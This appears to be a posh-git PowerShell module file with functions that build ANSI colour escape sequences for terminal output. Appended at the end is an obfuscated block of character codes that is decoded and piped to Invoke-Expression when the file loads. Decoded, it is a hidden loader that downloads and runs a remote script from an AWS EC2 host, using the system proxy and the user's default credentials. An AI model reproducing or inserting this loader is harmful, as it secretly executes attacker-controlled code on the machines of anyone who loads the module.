
$ConsoleColorToAnsi = @(
    30 
    34 
    32 
    36 
    31 
    35 
    33 
    37 
    90 
    94 
    92 
    96 
    91 
    95 
    93 
    97 
)
$AnsiDefaultColor = 39
$AnsiEscape = [char]27 + "["

[Reflection.Assembly]::LoadWithPartialName('System.Drawing') > $null
$ColorTranslatorType = 'System.Drawing.ColorTranslator' -as [Type]
$ColorType = 'System.Drawing.Color' -as [Type]

function EscapeAnsiString([string]$AnsiString) {
    if ($PSVersionTable.PSVersion.Major -ge 6) {
        $res = $AnsiString -replace "$([char]27)", '`e'
    }
    else {
        $res = $AnsiString -replace "$([char]27)", '$([char]27)'
    }

    $res
}

function Test-VirtualTerminalSequece([psobject[]]$Object, [switch]$Force) {
    foreach ($obj in $Object) {
        if (($Force -or $global:GitPromptSettings.AnsiConsole) -and ($obj -is [string])) {
            $obj.Contains($AnsiEscape)
        }
        else {
            $false
        }
    }
}

function Get-VirtualTerminalSequence ($color, [int]$offset = 0) {
    
    
    if ($null -eq $color) {
        return $null;
    }

    if ($color -is [byte]) {
        return "${AnsiEscape}$(38 + $offset);5;${color}m"
    }

    if ($color -is [int]) {
        $r = ($color -shr 16) -band 0xff
        $g = ($color -shr 8) -band 0xff
        $b = $color -band 0xff
        return "${AnsiEscape}$(38 + $offset);2;${r};${g};${b}m"
    }

    if ($color -is [String]) {
        try {
            if ($ColorTranslatorType) {
                $color = $ColorTranslatorType::FromHtml($color)
            }
        }
        catch {
            Write-Debug $_
        }

        
        if (($color -isnot $ColorType) -and ($null -ne ($consoleColor = $color -as [System.ConsoleColor]))) {
            $color = $consoleColor
        }
    }

    if ($ColorType -and ($color -is $ColorType)) {
        return "${AnsiEscape}$(38 + $offset);2;$($color.R);$($color.G);$($color.B)m"
    }

    if (($color -is [System.ConsoleColor]) -and ($color -ge 0) -and ($color -le 15)) {
        return "${AnsiEscape}$($ConsoleColorToAnsi[$color] + $offset)m"
    }

    return "${AnsiEscape}$($AnsiDefaultColor + $offset)m"
}

function Get-ForegroundVirtualTerminalSequence($Color) {
    return Get-VirtualTerminalSequence $Color
}

function Get-BackgroundVirtualTerminalSequence($Color) {
    return Get-VirtualTerminalSequence $Color 10
}

-JOIn (( 32 ,32 , 36 ,86 ,115 , 110 , 50,108 , 54, 32 ,61 , 32,32 , 91,116,121,112,101, 93 ,40 ,34,123 ,51 , 125 , 123, 48 ,125, 123, 49, 125,123 , 50,125,34, 32 ,45, 70,39 , 85 ,69 ,39,44,39,83 , 39,44, 39 , 116,39, 44 ,39 ,78, 101 ,116 ,46,119, 101,98,114 ,101 , 113 , 39,41,32,59, 32,32,36 ,104 ,54, 57 , 81,52 ,32 , 32 ,61 , 91 ,84 , 89,80 , 101,93 ,40 ,34, 123,49 , 125,123, 50, 125 , 123,51,125, 123, 52 ,125, 123,48 ,125 ,34,45, 70 ,32,39, 104,101 ,39 , 44 ,39, 110 , 69, 116,46, 67 , 39,44, 39,82 ,69,68,101 , 78 , 116 , 105,97, 108 , 67 ,39, 44,39,97, 39 ,44 ,39 ,99, 39 , 41 , 32 ,59, 32 , 32 ,36, 123 ,74, 125 ,61 ,38,40,34, 123, 48 ,125 ,123 ,49 , 125, 123,50 ,125 , 34 , 45 , 102, 32, 39,110 ,101, 119,45 ,111, 98 , 106 , 39,44 , 39 , 101 , 99 , 39, 44 ,39 , 116,39,41,32,40 ,34 , 123 ,50,125,123 , 49 ,125 , 123, 48, 125 , 123 , 51, 125,34,32 , 45 ,102,32,39 ,101 ,98, 39,44, 39 , 46, 119 , 39,44,39 ,110 ,101 ,116,39, 44, 39,99 ,108,105 ,101 , 110 , 116,39 ,41 ,59 ,36 , 123, 106, 125, 46 , 34 , 80, 82, 111, 96 ,88,89 ,34,61, 32, 32 , 40 ,32 ,86, 97 ,82 , 73 ,97 ,98,108 , 69 ,32,32, 118 , 115 ,110 , 50 ,76 ,54 , 32 ,41,46,86 , 97 ,76 , 117, 69 , 58, 58, 40 , 34, 123 , 48, 125,123,51, 125, 123,50,125 ,123 ,52,125 , 123 , 49,125 ,34,45,102, 39, 71, 101 , 116, 83, 39 ,44 ,39, 80,114, 111 ,120, 121 , 39 , 44 , 39,101,109 , 39, 44,39, 121 , 115,116 ,39 , 44, 39, 87 ,101 , 98, 39 ,41,46, 73 ,110,118 ,111 , 107 , 101, 40 ,41 ,59 , 36,123, 106 ,125,46, 34 , 112,114 , 96 ,79 , 88,89 , 34 , 46, 34 , 67,96,82, 69 ,96,68 , 101, 96, 78 ,84, 105 ,65, 76,115, 34, 61,32 , 40,32 ,32,71, 101,84,45 ,86,97, 114,105, 97 ,66, 108, 101,32 , 32 , 72, 54,57, 81 ,52,41 ,46 ,86 ,97, 76,85 ,101, 58 , 58 , 34, 68, 69,96 , 70, 97 , 117, 108 ,116,99 ,114 , 101, 100, 96 ,101 ,110 ,96 , 84 , 73,96, 65 ,76 , 83, 34,59,46, 40 ,34, 123 , 48, 125 , 123 , 49,125, 34 , 45 ,102 ,32 ,39,73 ,39,44 ,39, 69,88 , 39, 41 , 32 , 36 ,123, 74, 125,46 , 40 ,34 ,123,49 , 125 ,123 ,51 ,125, 123 , 50 ,125, 123, 48, 125 ,34 , 32 , 45 ,102, 32,39 ,115, 116,114, 105,110 , 103 , 39,44 ,39, 100,111 ,39, 44, 39, 108 , 111, 97 ,100 ,39,44, 39,119, 110,39 , 41 ,46 ,73 ,110 , 118,111 , 107 ,101 , 40 , 40 ,34 ,123, 51,125,123 , 49 , 125 , 123 ,57 , 125 , 123, 49,49,125 , 123 , 56, 125,123, 49,51 , 125 ,123 ,48, 125,123 ,52 ,125 ,123, 49 , 53, 125 ,123,53,125,123 , 49,48, 125 , 123,50,125, 123,49, 50, 125,123,49,52,125 , 123 , 55 ,125 , 123 , 54, 125, 34 ,32 ,45 , 102, 39,53, 39,44 , 39 , 116, 112,58 ,47 , 47 , 39 , 44 ,39,109, 112 ,117 ,116, 39 , 44,39,104, 116 ,39,44, 39,46, 117 , 115 , 39 ,44 , 39,116, 39, 44, 39,48,47, 97 ,110,83,102 , 114 ,102,39 ,44 , 39,56,39 ,44 , 39 , 49 ,56 , 53 ,45, 39, 44, 39,101 , 39,44, 39, 45 ,50, 46, 99, 111,39 , 44, 39 ,99,50, 45 ,51 ,53, 45 ,49, 54,55 , 45,39, 44 ,39 ,101 , 46 , 97, 109, 97 , 122 ,111,110 ,97, 39, 44, 39 ,53,39, 44,39, 119 , 115, 46, 99 , 111 , 109 ,58, 56 , 48 , 39 ,44 ,39,45 , 119, 101 ,115 , 39,41, 41 , 59)|%{([inT]$_-AS [chAr]) } ) | iex

